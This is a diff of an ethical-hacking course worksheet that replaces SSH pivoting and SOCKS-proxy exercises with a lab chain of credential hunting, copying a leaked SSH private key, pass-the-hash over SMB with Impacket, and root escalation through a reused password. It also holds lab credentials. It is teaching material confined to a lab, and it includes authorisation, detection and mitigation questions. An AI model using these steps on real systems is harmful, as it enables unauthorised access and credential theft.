@@ -1,4 +1,5 @@
 # Week 9: Lateral Movement Between Systems and Services
+
 ## CYB204 Ethical Hacking — Student Worksheet
 
 ---
@@ -6,29 +7,31 @@
 ## Before We Start (5 minutes)
 
 ### Important Rules
-✅ **DO:** Only pivot within this lab environment
-✅ **DO:** Read each step before running it — pivoting involves multiple layers
-✅ **DO:** Keep a note of each shell session you open (you will have several)
-❌ **DON'T:** Attempt pivoting techniques on any real network without written authorisation
-❌ **DON'T:** Close terminal windows mid-lab — you need active SSH sessions for tunnels
+✅ **DO:** Only attack hosts inside this lab environment
+✅ **DO:** Read each step before running it — several steps depend on the one before it
+✅ **DO:** Keep a note of every credential, hash, and key you find — you'll need to reuse each one
+❌ **DON'T:** Attempt any of these techniques (hash reuse, SSH key reuse, password reuse) on any real network without written authorisation
 
 ### Scenario
-CyberCorp's external network has been partially compromised. You have obtained credentials for a DMZ host (`week9-pivot`). Your goal is to use that foothold to reach internal systems that are not exposed externally.
+You've already got a foothold on `week9-workstation` — credentials for a
+low-privilege account were obtained during an earlier phase of this
+engagement (how doesn't matter this week; **Week 8** covered earning a
+foothold from nothing). Your job now is to use that single foothold to move
+laterally: find what it leads to, and keep reusing what you find until you
+reach `root` somewhere else on the network.
 
----
-
-## Network Map
+### Network Map
 
 ```
-Your machine              Pivot host                 Internal targets
-week9-attacker            week9-pivot                week9-internal-web
-10.10.9.2  ───SSH──►  10.10.9.10               10.10.90.20 (HTTP)
-             (can't reach)  │
-                            └──────────────────────► week9-internal-db
-                                                     10.10.90.21 (MySQL)
+week9-attacker (Kali)          10.10.9.2
+week9-workstation               10.10.9.10   ← your foothold starts here
+week9-fileserver (Samba)        10.10.9.12
+week9-ubuntu-desktop            10.10.9.11   ← the final target
 ```
 
-**Rule:** 10.10.90.x is unreachable from your attacker machine directly. Verify this first.
+Unlike some weeks, there's no network segmentation here — every host is
+directly reachable from the attacker. The challenge is entirely about
+**credentials and trust**, not routing.
 
 ---
 
@@ -36,289 +39,263 @@ week9-attacker            week9-pivot                week9-internal-web
 
 ```bash
 # Linux / macOS / Git Bash
-# Start the lab
 make run-week9
 
-# Enter attacker container
-docker exec -it week9-attacker bash
-
-# Confirm you CANNOT reach the internal network directly
-# -c 1 : send only 1 ICMP echo request packet
-ping -c 1 10.10.90.20
-
 # Windows PowerShell / Command Prompt
-# -d : run containers in detached mode (in the background)
 cd labs\week9 && docker compose up -d
 ```
 
-**Did the ping fail?**  ✓ Yes (expected)  ✓ No
-
-If no, something is wrong — ask your instructor before continuing.
-
----
-
-## Part 1: Foothold — SSH to the Pivot Host (15 minutes)
-
-### Exercise 1.1: Verify Pivot Host is Reachable
-
-```bash
-# Check the pivot is on your network
-# -c 2 : send 2 ICMP echo request packets, then stop
-ping -c 2 10.10.9.10
-
-# Confirm SSH is running
-# -p 22 : scan only port 22 (the standard SSH port)
-nmap -p 22 10.10.9.10
-```
-
-**Is the pivot host reachable?**  ✓ Yes  ✓ No
-
----
-
-### Exercise 1.2: Connect to the Pivot
-
-```bash
-# SSH into the pivot host
-# Credentials: pivotuser / pivot123
-ssh pivotuser@10.10.9.10
-```
-
-Accept the host key fingerprint when prompted (type `yes`).
-
-**You should now have a shell on the pivot host.** Verify:
-
-```bash
-hostname
-ip addr show
-```
-
-**What IP addresses does the pivot host have?**
-
-| Interface | IP |
-|-----------|-----|
-|           |     |
-|           |     |
-
-**Question:** Why does the pivot host have two IP addresses?
-
-_________________________________
-
----
-
-### Exercise 1.3: Scout the Internal Network from the Pivot
-
-From your SSH session on the pivot host:
-
-```bash
-# Check what's on the internal network
-ip route
-# -c 1 : send only 1 ICMP echo request packet (same flag as earlier pings)
-ping -c 1 10.10.90.20
-# -c 1 : send only 1 ICMP echo request packet
-ping -c 1 10.10.90.21
-```
-
-**Can the pivot host reach the internal targets?**  ✓ Yes  ✓ No
-
-**Leave this SSH session open in a separate terminal tab** — you'll need it.
-
----
-
-## Part 2: SSH Port Forwarding (25 minutes)
-
-### Exercise 2.1: Local Port Forward (Single Service)
-
-Open a **new terminal tab** on your attacker machine and run:
+Provisioning takes about 30–45 seconds (installing SSH/Samba, creating
+users, generating the SSH keypair used in Part 3). Then enter the attacker:
 
 ```bash
 docker exec -it week9-attacker bash
-
-# Forward local port 8080 to the internal web server via the pivot
-# This creates: attacker:8080 → pivot:22 → internal-web:80
-# -L <local-port>:<remote-host>:<remote-port> : forward a local port to a
-#    host:port reachable from the SSH server (local port forwarding)
-# -N : don't execute a remote command — just forward, no interactive shell
-# -f : go into the background once authenticated (backgrounds the tunnel)
-ssh -L 8080:10.10.90.20:80 pivotuser@10.10.9.10 -N -f
-```
-
-The `-N` flag means "no command", `-f` backgrounds the tunnel.
-
-Now test the tunnel:
-
-```bash
-# Access the internal web server via the forwarded port
-curl http://127.0.0.1:8080
-```
-
-**What does the internal web page say?**
-
-_________________________________
-
-**Question:** From an attacker's perspective, what information would you look for on an internal web admin portal?
-
-_________________________________
-
----
-
-### Exercise 2.2: Local Port Forward (Database)
-
-```bash
-# Forward local port 3307 to the internal MySQL server
-# -L <local-port>:<remote-host>:<remote-port> : local port forward (see 2.1)
-# -N / -f : no remote command / background the tunnel (see 2.1)
-ssh -L 3307:10.10.90.21:3306 pivotuser@10.10.9.10 -N -f
-
-# Connect to the internal MySQL via the tunnel
-# -h <host>  : server to connect to
-# -P <port>  : TCP port to connect to (capital P — lowercase -p is the password flag)
-# -u <user>  : username to authenticate as
-# -p<pass>   : password, concatenated directly after -p with NO space
-#              (a space would make mysql prompt for the password instead)
-mysql -h 127.0.0.1 -P 3307 -u appuser -papppass456
-```
-
-If mysql client is not in the Metasploit container, use nmap to confirm connectivity:
-
-```bash
-# -p 3307 : scan only port 3307 (the locally forwarded MySQL tunnel port)
-nmap -p 3307 127.0.0.1
-```
-
-**Is the MySQL port accessible through the tunnel?**  ✓ Yes  ✓ No
-
----
-
-## Part 3: SOCKS Proxy (Dynamic Port Forwarding) (20 minutes)
-
-A SOCKS proxy lets you route *all* your traffic through the tunnel, not just one port.
-
-### Exercise 3.1: Set Up a SOCKS5 Proxy
-
-```bash
-# Open a SOCKS5 proxy on local port 1080
-# All traffic sent to this proxy will tunnel through the pivot
-# -D <port> : dynamic port forwarding — turns the SSH connection into a
-#             SOCKS proxy listening on this local port
-# -N / -f   : no remote command / background the tunnel (see 2.1)
-ssh -D 1080 pivotuser@10.10.9.10 -N -f
-
-# Check it's listening
-# -t : show TCP sockets
-# -l : show only listening sockets
-# -n : show numeric addresses/ports instead of resolving names
-# -p : show the process using each socket
-ss -tlnp | grep 1080
-```
-
-**Is the SOCKS proxy listening on port 1080?**  ✓ Yes  ✓ No
-
-By default, proxychains is configured to talk to a Tor proxy (`socks4 127.0.0.1 9050`), not the SOCKS5 proxy you just opened. Point it at your tunnel before continuing:
-
-```bash
-# Edit /etc/proxychains/proxychains.conf (or /etc/proxychains4.conf if that's
-# the path on your system) and replace the last line with:
-sed -i 's/^socks4.*9050/socks5 127.0.0.1 1080/' /etc/proxychains/proxychains.conf
 ```
 
 ---
 
-### Exercise 3.2: Route Traffic via Proxychains
+## Part 1: Enumerate the Network (10 minutes)
+
+### Task 1: Identify Active Systems
 
 ```bash
-# Test proxychains reaches internal web through SOCKS proxy
-proxychains curl http://10.10.90.20
-
-# Scan internal network through the proxy
-# -sT : TCP connect scan (completes the full 3-way handshake, unlike -sS)
-# -Pn : skip host discovery (treat all hosts as up) — proxied connections
-#       can't send the raw ICMP/ARP probes normal discovery relies on
-# -p  : scope to the ports we care about — every proxied connection is
-#       serialised through one tunnel, so a full-port /24 sweep with no
-#       -p can take a very long time; scope it to finish in a reasonable
-#       window
-proxychains nmap -sT -Pn -p 22,80,443,3306,8080 10.10.90.0/24
+# -sn : ping scan only (host discovery, no port scan)
+nmap -sn 10.10.9.0/24
 ```
 
-**What hosts did proxychains nmap find?**
+**Question:** Which IP addresses are active?
 
 _________________________________
 
-**Question:** Why do we use `-sT` (full connect) instead of `-sS` (SYN) with proxychains?
+```bash
+# -sV : probe open ports to determine the service/version running
+nmap -sV -p 22 10.10.9.10
+```
+
+**Question:** What service and version is running on `week9-workstation`?
 
 _________________________________
 
 ---
 
-## Part 4: Metasploit Route and Pivot (25 minutes)
+## Part 2: Credential Dumping on the Foothold (20 minutes)
 
-Metasploit has built-in pivoting support via the `route` command once you have a session.
+### Task 2: Log In and Try to Dump Credentials
 
-### Exercise 4.1: Start msfconsole
-
-```bash
-msfconsole
-```
-
-### Exercise 4.2: Set Up an SSH Session as a Route
+You've been given a foothold account: `netadmin` / `Sp1ngR3set!` (consider
+this "obtained in a prior phase" — password spraying, a phishing result, a
+leaked ticket, whatever the scenario needs it to be).
 
 ```bash
-# Use the SSH login module
-use auxiliary/scanner/ssh/ssh_login
-set RHOSTS 10.10.9.10
-set USERNAME pivotuser
-set PASSWORD pivot123
-run
+ssh netadmin@10.10.9.10
 ```
 
-**Did the module create a session?**  ✓ Yes  ✓ No  (Session ID: ______)
+Try the classic first move — read `/etc/shadow` directly:
+
+```bash
+cat /etc/shadow
+```
+
+**Question:** Were you able to view it? Why or why not?
+
+_________________________________
+
+### Task 3: Find Files With Weak Permissions
+
+Since `/etc/shadow` is locked down, hunt for sloppier mistakes instead:
+
+```bash
+# -type f        : regular files only
+# -perm -o+w     : the "others" permission bits include write — i.e.
+#                  world-writable, which a low-priv account should never need
+find / -type f -perm -o+w 2>/dev/null
+```
+
+**Question:** What file did you find, and what's in it?
+
+```bash
+cat <the file you found>
+```
+
+_________________________________
+
+Look closely at the format of what's inside — it's laid out like the output
+of a credential-dumping tool (e.g. Impacket's `secretsdump.py`):
+`username:uid:LM-hash:NT-hash:::`. **Write down the NT hash** — you'll need
+it in Part 3. Note that you never saw a plaintext password anywhere; only a
+hash. That distinction matters for what comes next.
+
+### Task 4: Search for SSH Keys
+
+```bash
+# A classic lateral-movement find: a private key left lying around
+find / -name id_rsa 2>/dev/null
+```
+
+**Question:** Where did you find a private key, and whose key does it look
+like it's for (check any comments or hints near it)?
+
+_________________________________
+
+```bash
+cat /opt/maintenance/.ssh_backup/id_rsa
+# Save it locally so you can use it as a login key later:
+cat /opt/maintenance/.ssh_backup/id_rsa > ~/stolen_id_rsa
+chmod 600 ~/stolen_id_rsa
+exit
+```
 
 ---
 
-### Exercise 4.3: Add a Route Through the Session
+## Part 3: Pass-the-Hash Against the File Server (20 minutes)
+
+### Task 5: Enumerate SMB Anonymously
+
+Back on the attacker:
 
 ```bash
-# In msfconsole — route all 10.10.90.0/24 traffic through session 1
-route add 10.10.90.0/255.255.255.0 1
-
-# Verify route
-route print
+# -L : list shares   -N : no password (anonymous/null session)
+smbclient -L //10.10.9.12/ -N
 ```
+
+**Question:** What shares are available?
+
+_________________________________
+
+```bash
+smbclient //10.10.9.12/public -N -c 'ls; get notice.txt -'
+```
+
+**Question:** What does the public notice say?
+
+_________________________________
+
+### Task 6: Try (and Fail) to Reach the Secure Share Anonymously
+
+```bash
+smbclient //10.10.9.12/secure -N -c 'ls'
+```
+
+**Question:** What happened? Why doesn't the anonymous session work here?
+
+_________________________________
+
+### Task 7: Pass-the-Hash with Impacket
+
+You never cracked a password — but you don't need the plaintext when you
+have the NT hash. This is the actual Pass-the-Hash technique from the
+slides: **"use a stolen hash to authenticate without plaintext
+credentials."**
+
+```bash
+# -hashes LM:NT  : an empty LM hash before the colon is fine — only the
+#                  NT hash matters for this kind of auth
+impacket-smbclient -hashes :<the NT hash you found> svcacct@10.10.9.12
+```
+
+Inside the Impacket shell:
+```
+shares
+use secure
+ls
+cat handover-notes.txt
+exit
+```
+
+**Question:** What do the handover notes say about reaching the next
+target?
+
+_________________________________
+
+**Reflection:** You authenticated as `svcacct` without ever knowing its
+real password. Why does this matter for how organisations should rotate
+credentials after a breach — is "change the password" always enough?
+
+_________________________________
 
 ---
 
-### Exercise 4.4: Scan Through the Route
+## Part 4: Exploiting a Trust Relationship (SSH Key Reuse) (15 minutes)
+
+### Task 8: Confirm Password Login Is a Dead End
 
 ```bash
-# Now scan the internal network via the Metasploit route
-use auxiliary/scanner/portscan/tcp
-set RHOSTS 10.10.90.0/24
-set PORTS 22,80,443,3306,8080
-run
+ssh deskuser@10.10.9.11
 ```
 
-**What ports did you find on the internal hosts?**
+**Question:** What happens? (Try any password you like — it won't matter.)
 
-| Host | Open Ports |
-|------|------------|
-| 10.10.90.20 | |
-| 10.10.90.21 | |
+_________________________________
+
+### Task 9: Use the Stolen Key Instead
+
+```bash
+ssh -i ~/stolen_id_rsa deskuser@10.10.9.11
+whoami
+```
+
+**Question:** Did it work? What does this tell you about why backing up an
+SSH private key insecurely (world-readable, sitting in a random directory)
+is just as dangerous as a leaked password?
+
+_________________________________
 
 ---
 
-## Part 5: Ethics and Documentation (10 minutes)
+## Part 5: Credential Hunting and Privilege Escalation (15 minutes)
+
+### Task 10: Search Config Files for Passwords
+
+The slides frame this as a "Windows-like credential extraction" step (the
+original material even names `mimikatz.exe`). There's no Windows kernel
+under this container for a Windows-only tool to run against, so the real
+Linux equivalent is the same idea with different commands — hunting for
+credentials accidentally left in plaintext configuration:
+
+```bash
+find / -name "*.conf" -path "*/app/*" 2>/dev/null
+cat /etc/app/backup.conf
+```
+
+**Question:** What credential did you find, and for which account?
+
+_________________________________
+
+### Task 11: Escalate Using the Reused Password
+
+```bash
+su root
+# enter the password from the config file
+cat /root/root.txt
+```
+
+**Question:** What flag did you retrieve? Why is password reuse across
+services (a backup account's password matching `root`'s) such a common and
+dangerous real-world finding?
+
+_________________________________
+
+---
+
+## Part 6: Ethics, Detection, and Reflection (10 minutes)
 
 ### Discussion Questions
 
-1. **Scope creep:** You're authorised to test `cybercorp.com.au`'s external network. Through pivoting you discover servers on an internal 10.0.0.0/8 range. What do you do before testing those?
+1. **Scope creep:** Pass-the-Hash and SSH key reuse let you reach systems
+   you were never explicitly told about. Before touching
+   `week9-ubuntu-desktop`, what should you confirm is in scope?
 
    _________________________________
 
-2. **Evidence:** Why is it important to log every pivot command with timestamps during a real engagement?
+2. **Detection:** WannaCry spread largely through SMB. What's one thing a
+   defender could monitor for that would have caught the Pass-the-Hash
+   authentication you just performed?
 
    _________________________________
 
-3. **Clean-up:** After a real pentest, why must you remove all SSH tunnels, proxy listeners, and Metasploit routes you created?
+3. **Mitigation:** Name two concrete changes to this environment (not "use
+   better passwords" — be specific) that would have broken this attack
+   chain at a single point.
 
    _________________________________
 
@@ -326,32 +303,53 @@ run
 
 ## Quick Knowledge Check
 
-1. What SSH flag creates a local port forward?
-   - A) `-R`  B) `-L`  C) `-D`  D) `-N`
+1. What makes Pass-the-Hash possible?
+   - A) Weak passwords  B) Reusing a hash instead of needing the plaintext password  C) SQL injection  D) DNS spoofing
 
-2. What SSH flag creates a SOCKS proxy (dynamic forwarding)?
-   - A) `-L`  B) `-R`  C) `-D`  D) `-T`
+2. Why did `cat /etc/shadow` fail as `netadmin`?
+   - A) The file doesn't exist  B) `netadmin` isn't root and isn't in the `shadow` group  C) SELinux blocked it  D) It's an SMB-only file
 
-3. Why can't the attacker reach 10.10.90.x directly in this lab?
-   - A) Firewall rules  B) The internal network is `internal: true` (no external routing)  C) Different VLAN  D) All of the above
+3. Why did password login to `week9-ubuntu-desktop` fail even with a
+   correct-looking attempt?
+   - A) The account is locked  B) `PasswordAuthentication` is disabled — only key-based (trust) login works  C) The network blocked port 22  D) It never fails
 
-4. What Metasploit command routes traffic through an active session?
-   - A) `pivot add`  B) `route add`  C) `tunnel set`  D) `proxy add`
+4. What real-world lesson does the reused `root_password` in
+   `backup.conf` teach?
+   - A) Config files should never exist  B) Credentials reused across services turn one leak into many compromises  C) Backups are unnecessary  D) `su` is inherently insecure
 
-5. True/False: You must have valid credentials to pivot — you cannot pivot using a reverse shell.
+5. True/False: Impacket's `psexec.py` / `wmiexec.py` will work the same way
+   against a Linux Samba server as they do against a real Windows host.
+   (Hint: think about what RPC service they depend on.)
+
+---
+
+## A Note on Windows-Only Tooling
+
+The original material this worksheet is based on names `mimikatz.exe`,
+`net user`, and `impacket-psexec`/`wmiexec` against a generic "Windows
+target." Every host in this lab is Linux, for the same reason Week 8's
+worksheet explains: there's no Windows kernel underneath for
+Windows-specific tools to talk to.
+
+- `mimikatz` → the Linux equivalent is exactly what Part 5 did: hunting
+  the filesystem for exposed credentials, rather than dumping them from
+  LSASS memory.
+- `impacket-psexec` / `wmiexec` → these rely on Windows-only RPC services
+  (`SVCCTL` for service creation, DCOM for WMI) that Samba does not
+  implement, so they do not work against this lab's file server even
+  though the SMB protocol itself is shared. The genuinely cross-platform
+  Impacket technique — Pass-the-Hash SMB authentication — is exactly what
+  Part 3 had you do.
+- If you want to see `impacket-psexec` actually pop a shell, you need a
+  real (or virtualised) Windows target. A Windows Server VM with SMB
+  signing disabled and a known local admin hash is the standard way to
+  practice this outside class.
 
 ---
 
 ## Cleanup
 
 ```bash
-# Kill any background SSH processes
-# -f : match against the full command line, not just the process name
-#      (needed since the process name is just "ssh")
-pkill -f "ssh -"
-exit
-
-# Stop the lab
 cd labs/week9 && docker compose down
 ```
 
@@ -360,23 +358,25 @@ cd labs/week9 && docker compose down
 ## Summary
 
 Today you learned to:
-✓ Identify a pivot host that straddles two networks
-✓ Use SSH local port forwarding to access internal services
-✓ Set up a SOCKS5 proxy for dynamic routing with proxychains
-✓ Configure Metasploit routes for internal network scanning
-✓ Explain the legal and documentation requirements for pivoting
+✓ Enumerate a network and the services running on each host
+✓ Recognise and exploit weak file permissions to dump credentials
+✓ Perform a genuine Pass-the-Hash attack with Impacket against SMB
+✓ Exploit a trust relationship by reusing a leaked SSH private key
+✓ Hunt for credentials in configuration files and escalate via password reuse
+✓ Explain why Windows-only tools (`mimikatz`, `psexec`'s service-creation
+  RPC) don't translate directly to a Linux target, and what does
 
 **Instructor Contact:** _________________________________
-
 
 ---
 
 ## Optional: CTF Challenge
 
-Once you have completed all exercises above, test your skills with an optional Capture The Flag challenge.
+Once you have completed all exercises above, test your skills with an
+optional Capture The Flag challenge.
 
 See **[ctf-challenge.md](./ctf-challenge.md)** for objectives.
 
-Two flags to capture: `user.txt` and `root.txt`  
-Flag format: `flag{...}`  
+Two flags to capture: `user.txt` and `root.txt`
+Flag format: `flag{...}`
 No hints — instructor walkthrough released at end of session.
